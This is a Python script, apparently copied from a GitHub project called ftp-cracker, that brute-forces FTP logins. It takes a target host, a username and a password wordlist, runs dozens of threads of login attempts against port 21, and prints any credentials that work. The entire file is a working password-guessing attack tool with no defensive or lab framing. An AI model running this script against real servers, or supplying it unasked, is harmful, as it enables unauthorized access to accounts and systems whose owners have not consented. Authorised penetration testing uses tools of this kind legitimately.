#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/AniketBhunia/ftp-cracker/blob/main/ftp_cracker.py

import ftplib
import threading
import queue
from colorama import Fore, init
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

# init the console for colors (for Windows)

# port of FTP
port = 21
threadLock = threading.Lock()

def connect_ftp(q,executor):
    global threadLock
    while not q.empty():
        # get the password from the queue
        password = q.get()   

        # initialize the FTP server object
        server = ftplib.FTP()
        server.set_pasv(False)

        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)    
            # login using the credentials (user & password)
            server.login(user, password)
        except TimeoutError:
            # timeout error
            print("Timed out: " + "password: " + password)
            pass
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            threadLock.acquire()
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            threadLock.release()
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            if q.empty() is not True:
                q.task_done()
    executor.shutdown(wait=False,cancel_futures=True)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="FTP Cracker using Python")
    parser.add_argument("host", help="The target host or IP address of the FTP server")
    parser.add_argument("-u", "--user", help="The username of target FTP server")
    parser.add_argument("-p", "--passlist", help="The path of the pass list")
    parser.add_argument("-t", "--threads", help="Number of workers to spawn for login, default is 30", default=30)

    args = parser.parse_args()
    # hostname or IP address of the FTP server
    host = args.host
    # username of the FTP server, root as default for linux
    user = args.user
    passlist = args.passlist
    # number of threads to spawn
    n_threads = int(args.threads)
    # read the wordlist of passwords
    passwords = open(passlist).read().split("\n")

    print("[+] Passwords to try:", len(passwords))
    
    q = queue.Queue()

    # put all passwords to the queue
    for password in passwords:
        q.put(password)

    with concurrent.futures.ThreadPoolExecutor(max_workers=n_threads) as executor:
        for i in range(q.qsize()):
            executor.submit(connect_ftp, q, executor)

    # wait for the queue to be empty
    q.join()
